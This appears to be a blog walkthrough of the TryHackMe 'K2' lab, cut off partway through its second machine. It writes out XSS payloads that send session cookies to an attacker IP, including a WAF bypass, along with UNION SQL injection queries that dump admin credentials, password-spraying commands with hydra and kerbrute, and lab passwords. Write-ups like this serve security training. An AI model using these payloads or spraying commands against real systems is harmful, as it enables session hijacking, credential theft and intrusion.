<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><style>:root{--accent-color:#FF4D4D;--font-size:17.5px}</style><title>THM: K2</title>
<meta name=description content="Platform: TryHackMe Link: K2 Level: Hard OS: Linux and Windows (The room has three different machines) Base Camp The Base Camp machine in the K2 challenge …"><meta name=keywords content="TryHackMe"><meta property="og:url" content="https://scorpiosec.com/posts/thm-k2/"><meta property="og:type" content="website"><meta property="og:title" content="THM: K2"><meta property="og:description" content="Platform: TryHackMe Link: K2 Level: Hard OS: Linux and Windows (The room has three different machines) Base Camp The Base Camp machine in the K2 challenge …"><meta property="og:image" content="https://scorpiosec.com/images/THM-K2/K2.png"><meta property="og:image:secure_url" content="https://scorpiosec.com/images/THM-K2/K2.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:title content="THM: K2"><meta name=twitter:description content="Platform: TryHackMe Link: K2 Level: Hard OS: Linux and Windows (The room has three different machines) Base Camp The Base Camp machine in the K2 challenge …"><meta property="twitter:domain" content="https://scorpiosec.com/posts/thm-k2/"><meta property="twitter:url" content="https://scorpiosec.com/posts/thm-k2/"><meta name=twitter:image content="https://scorpiosec.com/images/THM-K2/K2.png"><link rel=canonical href=https://scorpiosec.com/posts/thm-k2/><link rel=stylesheet type=text/css href=/css/normalize.min.css media=print><link rel=stylesheet type=text/css href=/css/main.min.css><link id=dark-theme rel=stylesheet href=/css/dark.min.css><script src=/js/bundle.min.dbdc9b4541e086f12258f5155a48310ed9f06d931aacfe9b7c85f8699b1f5cb2.js integrity="sha256-29ybRUHghvEiWPUVWkgxDtnwbZMarP6bfIX4aZsfXLI="></script></head><body><script>setThemeByUserPref()</script><header class=header><nav class=header-nav><div class=avatar><a href=https://scorpiosec.com/><img src=/redscorpio.jpg alt=avatar></a></div><div class=nav-title><a class=nav-brand href=https://scorpiosec.com/>Scorpiosec</a></div><div class=nav-links><div class=nav-link><a href=https://scorpiosec.com/posts/ aria-label><span data-feather=book></span> Posts</a></div><div class=nav-link><a href=https://scorpiosec.com/projects/ aria-label><span data-feather=code></span> Projects</a></div><div class=nav-link><a href=https://scorpiosec.com/tags/ aria-label><span data-feather=tag></span> Tags</a></div><div class=nav-link><a href=https://scorpiosec.com/categories/ aria-label><span data-feather=folder></span> Categories</a></div><div class="nav-link language-switcher"><a href=/fr/posts/thm-k2/>Français</a></div><span class=nav-icons-divider></span><div class="nav-link dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a aria-hidden=true role=switch><span class=theme-toggle-icon data-feather=moon></span></a></div><div class=nav-link id=hamburger-menu-toggle><span class="sr-only hamburger-menu-toggle-screen-reader-target">menu</span>
<a aria-checked=false aria-labelledby=hamburger-menu-toggle id=hamburger-menu-toggle-target role=switch><span data-feather=menu></span></a></div><ul class="nav-hamburger-list visibility-hidden"><li class=nav-item><a href=https://scorpiosec.com/posts/><span data-feather=book></span> Posts</a></li><li class=nav-item><a href=https://scorpiosec.com/projects/><span data-feather=code></span> Projects</a></li><li class=nav-item><a href=https://scorpiosec.com/tags/><span data-feather=tag></span> Tags</a></li><li class=nav-item><a href=https://scorpiosec.com/categories/><span data-feather=folder></span> Categories</a></li><li class="nav-item dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a role=switch><span class=theme-toggle-icon data-feather=moon></span></a></li></ul></div></nav></header><main id=content><div class="post container"><div class=post-header-section><h1>THM: K2</h1><small role=doc-subtitle></small><p class=post-date>17 min read |
<span class=post-date>October 24, 2024</span></p><ul class=post-tags><li class=post-tag><a href=https://scorpiosec.com/tags/tryhackme>TryHackMe</a></li></ul></div><div class=post-content><ul><li>Platform: TryHackMe</li><li>Link: <a href=https://tryhackme.com/r/room/k2room>K2</a></li><li>Level: Hard</li><li>OS: Linux and Windows (The room has three different machines)</li></ul><hr><h1 id=base-camp>Base Camp</h1><p>The Base Camp machine in the K2 challenge starts with a basic website. Initial enumeration reveals two subdomains linked to a ticketing system, one of which is vulnerable to Cross-Site Scripting (XSS). Using XSS, we steal a session cookie to access the admin dashboard, which is also susceptible to SQL injection. This flaw allows us to retrieve admin credentials, granting initial access. For privilege escalation, membership in the <code>adm</code> group permits reading system logs, where we uncover the root password.</p><h2 id=scanning-base-camp>Scanning (Base Camp)</h2><p>Use the IP address provided and update the <code>/etc/hosts</code> with <code>k2.thm</code>.</p><pre tabindex=0><code>./nmap_scan.sh k2.thm K2
</code></pre><p><strong>Results</strong></p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>Running detailed scan on open ports: 22,80
</span></span><span style=display:flex><span>Starting Nmap 7.94SVN <span style=color:#56b6c2>(</span> https://nmap.org <span style=color:#56b6c2>)</span> at 2024-10-09 13:00 CDT
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#c678dd>for</span> k2.thm <span style=color:#56b6c2>(</span>10.10.81.60<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>Host is up <span style=color:#56b6c2>(</span>0.21s latency<span style=color:#56b6c2>)</span>.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>PORT   STATE SERVICE VERSION
</span></span><span style=display:flex><span>22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 <span style=color:#56b6c2>(</span>Ubuntu Linux; protocol 2.0<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>| ssh-hostkey: 
</span></span><span style=display:flex><span>|   <span style=color:#d19a66>3072</span> fb:52:02:e8:d9:4b:83:1a:52:c9:9c:b8:43:72:83:71 <span style=color:#56b6c2>(</span>RSA<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>|   <span style=color:#d19a66>256</span> 37:94:6e:99:c2:4f:24:56:fd:ac:77:e2:1b:ec:a0:9f <span style=color:#56b6c2>(</span>ECDSA<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>|_  <span style=color:#d19a66>256</span> 8f:3b:26:92:67:ec:cc:05:30:27:17:c5:df:9a:42:d2 <span style=color:#56b6c2>(</span>ED25519<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>80/tcp open  http    nginx 1.18.0 <span style=color:#56b6c2>(</span>Ubuntu<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>|_http-title: Dimension by HTML5 UP
</span></span><span style=display:flex><span>|_http-server-header: nginx/1.18.0 <span style=color:#56b6c2>(</span>Ubuntu<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span>Nmap <span style=color:#c678dd>done</span>: <span style=color:#d19a66>1</span> IP address <span style=color:#56b6c2>(</span><span style=color:#d19a66>1</span> host up<span style=color:#56b6c2>)</span> scanned in 14.15 seconds
</span></span></code></pre></div><p>We find two open ports 22 and 80.</p><h2 id=what-is-the-user-flag>What is the user flag?</h2><h3 id=enumeration>Enumeration</h3><p>At <code>http://k2.thm</code> we find a website for a company providing IT services.</p><p><img src=/images/THM-K2/k2_tryhackme_website.png alt="K2 base camp website"></p><p>The different pages don&rsquo;t offer anything exploitable and the contact page returns a <code>HTTP 405 error</code>.</p><p><img src=/images/THM-K2/HTTP-405.png alt="K2 base camp 405 error"></p><p>Trying some directory brute forcing does not yield anything valuable.</p><pre tabindex=0><code>gobuster dir -u http://k2.thm/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
</code></pre><p><img src=/images/THM-K2/gobuster_k2.png alt="K2 base camp gobuster cmd"></p><p>On the contrary we discover two different subdomains with ffuf.</p><pre tabindex=0><code>ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --fc 404 -t 100 -u http://k2.thm -H &#34;Host: FUZZ.k2.thm&#34; -ic -fs 13229
</code></pre><p><img src=/images/THM-K2/k2_subdomains.png alt="K2 base camp subdomains"></p><p>There is a login page for a ticketing system at <code>http://it.k2.thm/</code>.</p><p><img src=/images/THM-K2/k2_it_subdomain.png alt="K2 base camp IT domain"></p><p>A few directories are found by gobuster for this subdomain.</p><pre tabindex=0><code>gobuster dir -u http://it.k2.thm/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
</code></pre><p><img src=/images/THM-K2/it_subdomain_gobuster.png alt="IT subdomain hidden directories"></p><p>The same system has a login page for the Admin at <code>http://admin.k2.thm/</code>.</p><p><img src=/images/THM-K2/k2_admin_subdomain.png alt="Admin subdomain"></p><p>This subdomain has the same directories minus <code>register</code>.</p><pre tabindex=0><code>gobuster dir -u http://admin.k2.thm/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
</code></pre><p><img src=/images/THM-K2/subdomain_admin_gobuster.png alt="Admin subdomain hidden directories"></p><p>The tickets submitted at <code>http://it.k2.thm/</code> are viewable at <code>http://admin.k2.thm/</code>.</p><p>After creating an account we submit a few tickets but lack the credentials to access the admin page. Since the application is accepting user input let&rsquo;s test for XSS.</p><p>We intercept the request after submitting a ticket and modify it. We will also use two different payloads to determine which field is vulnerable.</p><pre tabindex=0><code>&lt;script src=&#34;http://YOUR_IP:PORT_NUMBER/title.txt&#34;&gt;&lt;/script&gt;
&lt;script src=&#34;http://YOUR_IP:PORT_NUMBER/description.txt&#34;&gt;&lt;/script&gt;
</code></pre><p><img src=/images/THM-K2/XSS_test.png alt="XSS test"></p><p>After sending the request, we get confirmation on our web server that the <code>description</code> field is vulnerable.</p><p><img src=/images/THM-K2/desc_vulneratble_XSS.png alt="XSS validated"></p><p>Furthermore, there is a session cookie in the request and after digging for more information, we learn that neither the <code>HttpOnly</code> nor the <code>Secure</code> flags are set on it. This all points to the possibility of cookie stealing.</p><p><img src=/images/THM-K2/cookie_no_flags.png alt="Cookie with no secure flags"></p><p>Let&rsquo;s use the payload below.</p><pre tabindex=0><code>&lt;script&gt;var i=new Image(); i.src=&#34;http://IP:PORT/?cookie=&#34;+btoa(document.cookie);&lt;/script&gt;
</code></pre><p><img src=/images/THM-K2/cookie_stealing_XSS_payload.png alt="Cookie stealing via XSS"></p><p>Unfortunately for us, it gets blocked by the WAF (Web Application Firewall).</p><p><img src=/images/THM-K2/WAF_message.png alt="WAF message"></p><p>After multiple tries, we successfully bypass the WAF by using string concatenation.</p><pre tabindex=0><code>&lt;script&gt;var i=new Image(); var c = &#34;do&#34; + &#34;cument&#34; + &#34;.&#34; + &#34;cookie&#34;; i.src=&#34;http://YOUR_IP:PORT_NUMBER/?cookie=&#34;+btoa(eval(c));&lt;/script&gt;
</code></pre><p><img src=/images/THM-K2/XSS_payload_bypass_WAF.png alt="WAF bypass payload"></p><p>On our web server, we receive the cookie value although we still have to decode it with the command below.</p><pre tabindex=0><code>echo &#34;CCOKIE_VALUE&#34; | base64 -d
</code></pre><p><img src=/images/THM-K2/cookie_value_base64.png alt="base64 cookie value"></p><p>After using it on the <code>admin</code> subdomain and reloading the page, we now have access to the dashboard at <code>http://admin.k2.thm/dashboard</code> where we find three tickets.</p><blockquote><p>You will not be automatically redirected to the admin dashboard.</p></blockquote><p><img src=/images/THM-K2/admin_dashboard_access.png alt="Admin dashboard access"></p><p>We can filter the tickets based on the title we provide. It is safe to assume that they are stored in a database. So our next step is to attempt a SQL injection.</p><p>We intercept the request and notice only one parameter (<code>title</code>).</p><p><img src=/images/THM-K2/admin_dashboard_request.png alt="Admin dashboard request"></p><p>Replacing the value of <code>title</code> with <code>'</code> (single quote) leads to a 500 error which is often a good sign of SQL injection possibility.</p><p><img src=/images/THM-K2/k2_SQLi_test.png alt="SQLi test K2 basecamp"></p><p>Let&rsquo;s store the request in a file and use it with SQLmap.</p><blockquote><p>Change the value of <code>title</code> back to <code>test</code>.</p></blockquote><pre tabindex=0><code>sqlmap -r request.txt
</code></pre><p><img src=/images/THM-K2/sqli_blocked.png alt="SQLmap exploitation"></p><p>Once again the WAF is stopping our exploitation, the same way it was doing it for the XSS attack. It is probably possible to get around it in SQLmap but that&rsquo;s above my pay grade at the moment. However, we can try to exploit it manually.</p><p>We can grab a plethora of SQLi payloads <a href=https://github.com/payloadbox/sql-injection-payload-list/blob/master/Intruder/detect/Generic_SQLI.txt>here</a> and use them with the <code>Intruder</code> feature of Burp Suite.</p><p><img src=/images/THM-K2/Intruder_burp.png alt="Burp Intruder SQLi"></p><p>In the <code>Payloads</code> sub-section we paste the list we got from Github, and for <code>Payload processing</code> we use <code>URL encoded all the characters</code>.</p><p><img src=/images/THM-K2/intruder_payload_settings.png alt="Burp Intruder SQLi settings"></p><p>As I was expected they all get blocked by the WAF, again.</p><p><img src=/images/THM-K2/SQLi_payloads_blocked.png alt="SQLI payloads blocked with Intruder"></p><p>Those where simple/generic SQLi payloads. Let&rsquo;s start from the <code>'</code> we used earlier and work from there. This time we can attempt some UNION attacks.</p><p>First in order to find out the number of columns, we will send some payloads with <code>Intruder</code> and find at which point we do not get an error.</p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-SQL data-lang=SQL><span style=display:flex><span><span style=color:#98c379>&#39; UNION SELECT NULL; --
</span></span></span><span style=display:flex><span><span style=color:#98c379>&#39;</span> <span style=color:#c678dd>UNION</span> <span style=color:#c678dd>SELECT</span> <span style=color:#c678dd>NULL</span>, <span style=color:#c678dd>NULL</span>; <span style=color:#7f848e>--
</span></span></span><span style=display:flex><span><span style=color:#7f848e></span><span style=color:#98c379>&#39; UNION SELECT NULL, NULL, NULL; --
</span></span></span><span style=display:flex><span><span style=color:#98c379>&#39;</span> <span style=color:#c678dd>UNION</span> <span style=color:#c678dd>SELECT</span> <span style=color:#c678dd>NULL</span>, <span style=color:#c678dd>NULL</span>, <span style=color:#c678dd>NULL</span>, <span style=color:#c678dd>NULL</span>; <span style=color:#7f848e>--
</span></span></span><span style=display:flex><span><span style=color:#7f848e></span><span style=color:#98c379>&#39; UNION SELECT NULL, NULL, NULL, NULL, NULL; --
</span></span></span><span style=display:flex><span><span style=color:#98c379>&#39;</span> <span style=color:#c678dd>UNION</span> <span style=color:#c678dd>SELECT</span> <span style=color:#c678dd>NULL</span>, <span style=color:#c678dd>NULL</span>, <span style=color:#c678dd>NULL</span>, <span style=color:#c678dd>NULL</span>, <span style=color:#c678dd>NULL</span>, <span style=color:#c678dd>NULL</span>; <span style=color:#7f848e>--
</span></span></span><span style=display:flex><span><span style=color:#7f848e></span><span style=color:#98c379>&#39; UNION SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL; --
</span></span></span><span style=display:flex><span><span style=color:#98c379>&#39;</span> <span style=color:#c678dd>UNION</span> <span style=color:#c678dd>SELECT</span> <span style=color:#c678dd>NULL</span>, <span style=color:#c678dd>NULL</span>, <span style=color:#c678dd>NULL</span>, <span style=color:#c678dd>NULL</span>, <span style=color:#c678dd>NULL</span>, <span style=color:#c678dd>NULL</span>, <span style=color:#c678dd>NULL</span>, <span style=color:#c678dd>NULL</span>; <span style=color:#7f848e>--
</span></span></span></code></pre></div><p><img src=/images/THM-K2/UNION_SQLi_payloads.png alt="Union SQLi payloads"></p><p>After running our attack, we find out that <code>' UNION SELECT NULL, NULL, NULL; --</code> is a working payload which means that three columns are expected.</p><p><img src=/images/THM-K2/UNION_SQLi_working_payload.png alt="Union SQLi successful payload"></p><p>Let&rsquo;s test it and try finding the running version of the database.</p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-SQL data-lang=SQL><span style=display:flex><span><span style=color:#98c379>&#39; UNION SELECT NULL, NULL, @@VERSION; --
</span></span></span></code></pre></div><p><img src=/images/THM-K2/SQLi_db_version.png alt="SQLi db version"></p><p>We are successful and find version <code>8.0.33-0ubuntu0.20.04.2</code>. Next we need to know which database we are currently in.</p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-SQL data-lang=SQL><span style=display:flex><span><span style=color:#98c379>&#39; UNION SELECT NULL, NULL, database(); --
</span></span></span></code></pre></div><p>We are in the <code>Ticket Review</code> database.</p><p><img src=/images/THM-K2/Ticket_review_db.png alt="Ticket review database"></p><p>Now let&rsquo;s list the names of all the tables in that database.</p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-SQL data-lang=SQL><span style=display:flex><span><span style=color:#98c379>&#39; UNION SELECT table_name, NULL, NULL FROM information_schema.tables WHERE table_schema = database(); --
</span></span></span></code></pre></div><p>And here are our three tables! <code>admin_auth</code>, <code>auth_users</code>, and <code>tickets</code>.</p><p><img src=/images/THM-K2/tables_list_k2.png alt="Tables list in Ticket Reviiew DB"></p><p>Let&rsquo;s check the content of <code>admin_auth</code>.</p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-SQL data-lang=SQL><span style=display:flex><span><span style=color:#98c379>&#39; UNION SELECT column_name, NULL, NULL FROM information_schema.columns WHERE table_name = &#39;</span><span style=color:#e06c75>admin_auth</span><span style=color:#98c379>&#39;; -- 
</span></span></span></code></pre></div><p>We discover four columns in the <code>admin_auth</code> table which are: <code>id</code>, <code>admin_username</code>, <code>admin_password</code>, and <code>email</code>.</p><p><img src=/images/THM-K2/admin_auth_columns.png alt="admin_auth columns"></p><p>Now we retrieve some credentials from <code>admin_username</code> and <code>admin_password</code>.</p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-SQL data-lang=SQL><span style=display:flex><span><span style=color:#98c379>&#39; UNION SELECT NULL, admin_username, admin_password FROM admin_auth; --
</span></span></span></code></pre></div><p>Various admin credentials are found, the first ones being: <code>james:Pwd@9tLNrC3!</code>.</p><pre tabindex=0><code>james:Pwd@9tLNrC3!
rose:VrMAogdfxW!9
bob:PasSW0Rd321
steve:St3veRoxx32
cait:PartyAlLDaY!32
xu:L0v3MyDog!3!
ash:PikAchu!IshoesU!
</code></pre><p><img src=/images/THM-K2/SQLi_admin_creds.png alt="admin credentials"></p><h3 id=initial-foothold-shell-as-james>Initial Foothold (shell as james)</h3><p>With <code>james:Pwd@9tLNrC3!</code> we are able to login via SSH and from there we can read the user flag.</p><p><img src=/images/THM-K2/user_flag_basecamp_k2.png alt="user flag for K2-basecamp"></p><h2 id=what-is-the-root-flag>What is the root flag?</h2><p>Trying to login with the other credentials fail. After running <code>id</code> we notice that <code>james</code> is part of the <code>adm</code> group.</p><p><img src=/images/THM-K2/adm_group.png alt="adm group membership"></p><p>On <a href=https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#lxc-lxd-group>this HackTricks page</a> we learn that the members of the <code>adm</code> group usually have &ldquo;permissions to read log files located inside /var/log/&rdquo;.</p><p><img src=/images/THM-K2/adm_group_info.png alt="adm group info"></p><p>In order to comb through the mountain of logs let&rsquo;s use a grep command.</p><pre tabindex=0><code>grep -ir &#34;password&#34;
</code></pre><ul><li><strong>-i</strong> for case insensitivity, grep will find matches regardless of whether the letters are uppercase or lowercase.</li><li><strong>-r</strong> to recursively search through directories and their subdirectories.</li></ul><p>In <code>nginx/access.log.1</code> we find a login attempt from the user <code>rose</code> with the password <code>RdzQ7MSKt)fNaz3!</code>.</p><p><img src=/images/THM-K2/rose_pwd.png alt="Rose password"></p><p>But using this password with <code>su rose</code> fails!</p><p><img src=/images/THM-K2/su_rose_failure.png alt="switch to user rose failure"></p><h3 id=privilege-escaltion>Privilege Escaltion</h3><p>Let&rsquo;s try this password against all the users on the system.</p><blockquote><p>The usernames were gathered from the <code>/etc/passwd</code> file.</p></blockquote><pre tabindex=0><code>hydra -L k2_users.txt -p &#39;RdzQ7MSKt)fNaz3!&#39; ssh://k2.thm
</code></pre><p>It turns out that this password belongs to the root account.</p><p><img src=/images/THM-K2/ssh_root_creds.png alt="root account credentials"></p><p>With <code>root:RdzQ7MSKt)fNaz3!</code> we login via SSH and recover the root flag.</p><p><img src=/images/THM-K2/root_flag_basecamp_k2.png alt="root flag for K2-basecamp"></p><h2 id=what-are-the-usernames-and-passwords-that-had-access-to-the-server>What are the usernames and passwords that had access to the server?</h2><p>The usernames we gathered from <code>/etc/passwd</code> and their respective passwords are below.</p><pre tabindex=0><code>james:Pwd@9tLNrC3!,root:RdzQ7MSKt)fNaz3!,rose:vRMkaVgdfxhW!8
</code></pre><h2 id=two-users-have-their-full-names-on-display-what-are-their-names>Two users have their full names on display. What are their names?</h2><p>From <code>/etc/passwd</code></p><p><img src=/images/THM-K2/users_full_names.png alt="users full names"></p><p><code>James Bold, Rose Bud</code>.</p><p>We can now move on to the next machine, Middle Camp.</p><h1 id=middle-camp>Middle Camp</h1><p>The Middle Camp machine in K2 is a Domain Controller without a web server. Leveraging credentials from the previous machine, we gain access via RPC. On the system, two notes about password policies partially reveal a user&rsquo;s password, using a custom Bash script we recover the complete password. With Bloodhound, we identify a group with <code>GenericAll</code> permissions on another account, allowing us to change that account&rsquo;s password and escalate. The new user, a member of <code>Backup Operators</code>, enables us to read the root flag, and we use <code>SeBackupPrivilege</code> to access registry hives and retrieve the administrator&rsquo;s hash.</p><h2 id=scanning-middle-camp>Scanning (Middle Camp)</h2><p>Update the <code>/etc/hosts</code> file with the IP address of the new machine for <code>k2.thm</code>, and scan it.</p><pre tabindex=0><code>sudo nmap -sC -sV -oA nmap/k2_MC k2.thm
</code></pre><p><strong>Results</strong></p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>Starting Nmap 7.94SVN <span style=color:#56b6c2>(</span> https://nmap.org <span style=color:#56b6c2>)</span> at 2024-10-16 11:38 CDT
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#c678dd>for</span> k2.thm <span style=color:#56b6c2>(</span>10.10.70.233<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>Host is up <span style=color:#56b6c2>(</span>0.19s latency<span style=color:#56b6c2>)</span>.
</span></span><span style=display:flex><span>Not shown: <span style=color:#d19a66>988</span> filtered tcp ports <span style=color:#56b6c2>(</span>no-response<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>PORT     STATE SERVICE       VERSION
</span></span><span style=display:flex><span>53/tcp   open  domain        Simple DNS Plus
</span></span><span style=display:flex><span>88/tcp   open  kerberos-sec  Microsoft Windows Kerberos <span style=color:#56b6c2>(</span>server time: 2024-10-16 16:38:36Z<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>135/tcp  open  msrpc         Microsoft Windows RPC
</span></span><span style=display:flex><span>139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
</span></span><span style=display:flex><span>389/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span style=color:#56b6c2>(</span>Domain: k2.thm0., Site: Default-First-Site-Name<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>445/tcp  open  microsoft-ds?
</span></span><span style=display:flex><span>464/tcp  open  kpasswd5?
</span></span><span style=display:flex><span>593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
</span></span><span style=display:flex><span>636/tcp  open  tcpwrapped
</span></span><span style=display:flex><span>3268/tcp open  ldap          Microsoft Windows Active Directory LDAP <span style=color:#56b6c2>(</span>Domain: k2.thm0., Site: Default-First-Site-Name<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>3269/tcp open  tcpwrapped
</span></span><span style=display:flex><span>3389/tcp open  ms-wbt-server Microsoft Terminal Services
</span></span><span style=display:flex><span>|_ssl-date: 2024-10-16T16:39:27+00:00; 0s from scanner time.
</span></span><span style=display:flex><span>| ssl-cert: Subject: <span style=color:#e06c75>commonName</span><span style=color:#56b6c2>=</span>K2Server.k2.thm
</span></span><span style=display:flex><span>| Not valid before: 2024-10-15T16:07:29
</span></span><span style=display:flex><span>|_Not valid after:  2025-04-16T16:07:29
</span></span><span style=display:flex><span>| rdp-ntlm-info: 
</span></span><span style=display:flex><span>|   Target_Name: K2
</span></span><span style=display:flex><span>|   NetBIOS_Domain_Name: K2
</span></span><span style=display:flex><span>|   NetBIOS_Computer_Name: K2SERVER
</span></span><span style=display:flex><span>|   DNS_Domain_Name: k2.thm
</span></span><span style=display:flex><span>|   DNS_Computer_Name: K2Server.k2.thm
</span></span><span style=display:flex><span>|   DNS_Tree_Name: k2.thm
</span></span><span style=display:flex><span>|   Product_Version: 10.0.17763
</span></span><span style=display:flex><span>|_  System_Time: 2024-10-16T16:38:47+00:00
</span></span><span style=display:flex><span>Service Info: Host: K2SERVER; OS: Windows; CPE: cpe:/o:microsoft:windows
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Host script results:
</span></span><span style=display:flex><span>| smb2-time: 
</span></span><span style=display:flex><span>|   date: 2024-10-16T16:38:50
</span></span><span style=display:flex><span>|_  start_date: N/A
</span></span><span style=display:flex><span>| smb2-security-mode: 
</span></span><span style=display:flex><span>|   3:1:1: 
</span></span><span style=display:flex><span>|_    Message signing enabled and required
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span>Nmap <span style=color:#c678dd>done</span>: <span style=color:#d19a66>1</span> IP address <span style=color:#56b6c2>(</span><span style=color:#d19a66>1</span> host up<span style=color:#56b6c2>)</span> scanned in 77.21 seconds
</span></span></code></pre></div><p>This time we are dealing with a Domain Controller. There is no web server, this target is all Active Directory.</p><p>We note the computer name <code>K2Server.k2.thm</code> which we add to the <code>/etc/hosts</code> file.</p><h2 id=what-is-the-user-flag-1>What is the user flag?</h2><h3 id=enumeration-1>Enumeration</h3><p>From the previous machine we know that the users with access to the server are <code>James Bold</code> and <code>Rose Bud</code>. SInce we are in an AD environment let&rsquo;s try to find some valid domain usernames. They usually follow a certain pattern so here is a list of possible AD usernames.</p><pre tabindex=0><code>James
Rose
James Bold
Rose Bud
j.bold
james.bold
bold.j
r.bud
rose.bud
bud.r
</code></pre><blockquote><p>We only have two users in this case so we can generate the different combinations pretty easily. When we need to do the same for a lot of users we can use a tool like <a href=https://github.com/urbanadventurer/username-anarchy>username-anarchy</a>.</p></blockquote><p>And let&rsquo;s add to that all the passwords we currently have.</p><pre tabindex=0><code>Pwd@9tLNrC3!
RdzQ7MSKt)fNaz3!
vRMkaVgdfxhW!8
</code></pre><h4 id=netexec-method>NetExec Method</h4><p>With the list of potential users and our passwords list from the previous machine we can enumerate users.</p><pre tabindex=0><code>netexec smb K2Server.k2.thm -u potential_AD_users.txt -p found_pwds.txt
</code></pre><p><img src=/images/THM-K2/valid_creds_k2AD.png alt="netexec AD enumeration"></p><p>The credentials <code>r.bud:vRMkaVgdfxhW!8</code> are found to be valid!</p><blockquote><p>Keep in mind that using netexec for AD enumeration <strong>will not work if null authentication is disabled</strong>. This is because we would need to provide valid credentials (username and password) to authenticate with the SMB services to perform the enumeration.</p></blockquote><h4 id=kerbrute-method>Kerbrute Method</h4><p>Kerbrute can also be used to find the valid usernames.</p><pre tabindex=0><code>./kerbrute userenum --dc K2Server.k2.thm -d k2.thm potential_AD_users.txt 
</code></pre><p><img src=/images/THM-K2/k2_valid_AD_usernames.png alt="kerbrute AD enumeration"></p><p>We can then spray our found passwords against the users.</p><pre tabindex=0><code>./kerbrute bruteuser --dc K2Server.k2.thm -d k2.thm found_pwds.txt j.bold

./kerbrute bruteuser --dc K2Server.k2.thm -d k2.thm found_pwds.txt r.bud
</code></pre><p><img src=/images/THM-K2/rose_bud_kerbrute.png alt="kerbrute credentials brute forcing"></p><blockquote><p>Kerbrute will work regardless of whether null authentication is enabled or disabled. It is designed to brute-force usernames or passwords against a <strong>Kerberos authentication</strong> service.</p></blockquote><h2 id=initial-foothold-shell-as-rose>Initial Foothold (shell as rose)</h2><p>With the valid credentials we login with evil-winrm.</p><pre tabindex=0><code>evil-winrm -i k2.thm -u r.bud -p &#34;vRMkaVgdfxhW\!8&#34;
</code></pre><p><img src=/images/THM-K2/foothold_k2MC.png alt="K2-Middle Camp foothold"></p><p>In <code>C:\Users\r.bud\Documents</code> we find two txt files: <code>notes.txt</code> and <code>note_to_james.txt</code>.</p><p><img src=/images/THM-K2/rbud_notes_content.png alt="notes content"></p><p>This is an exchange about some password compliance. James added two characters to his previous password which was <code>rockyou</code> in order to meet the criteria.</p><p>From that we know that James&rsquo; password is <strong>9</strong> characters long and includes <code>rockyou</code>, a special character and a number.</p><p>Let&rsquo;s use a Bash script to generate some passwords.</p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#7f848e>#!/bin/bash
</span></span></span><span style=display:flex><span><span style=color:#7f848e></span>
</span></span><span style=display:flex><span><span style=color:#e06c75>special_characters</span><span style=color:#56b6c2>=(</span><span style=color:#98c379>&#39;!&#39;</span> <span style=color:#98c379>&#39;@&#39;</span> <span style=color:#98c379>&#39;#&#39;</span> <span style=color:#98c379>&#39;$&#39;</span> <span style=color:#98c379>&#39;%&#39;</span> <span style=color:#98c379>&#39;^&#39;</span> <span style=color:#98c379>&#39;&amp;&#39;</span> <span style=color:#98c379>&#39;*&#39;</span><span style=color:#56b6c2>)</span>
